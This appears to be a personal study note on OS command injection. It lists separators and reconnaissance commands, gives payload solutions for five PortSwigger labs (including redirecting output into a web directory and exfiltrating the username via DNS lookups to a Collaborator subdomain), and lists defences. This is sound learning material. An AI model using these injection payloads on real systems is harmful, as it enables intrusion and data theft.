# What is OS command injection?
OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application

![[os-command-injection.svg]]
## Useful commands

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |
Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command

The following command separators work only on Unix-based systems:
- `;`
- Newline (`0x0a` or `\n`)

## Ways of injecting OS commands
- `&`
- `&&`
- `|`
- `||`


## Labs
* #Portswigger
	1. **OS command injection, simple case** #APPRENTICE 
		in the product function payload will be `1|whoami` encoded
	2. **Blind OS command injection with time delays** #PRACTITIONER 
		in the submit feedback function payload will be `||sleep+5||` in the email input
	3. **Blind OS command injection with output redirection** #PRACTITIONER 
		to solve this lab use OS command injection to print the user name in a file text `||whoami>/var/www/images/adel.txt||` and then get the file using image function
	4. **Blind OS command injection with out-of-band interaction** #PRACTITIONER 
		this is a blind OS injection so to determine does the injection success we will make DNS lookup on our server `||nslookup+burpcolab||`
	5. **Blind OS command injection with out-of-band data exfiltration** #PRACTITIONER 
		to to solve the lab you have to print the username but the problem is that this lab is blind output so we will make a DNS interaction and add the username on it using this payload `||nslookup+'whoami'.BURP-COLLABORATOR-SUBDOMAIN||` anything between backtick will execute as OS command 

# Common defences against OS command injection attacks
- never call out to OS commands from application-layer code but use safer platform APIs
- Validating against a whitelist of permitted values.
- Validating that the input is a number.
- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
- deploy a firewall
- avoid calling OS command instead call the programming language API
Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 0
  - item: "Server"
    user: "Effective against the attack"
    score: 0
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 50

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```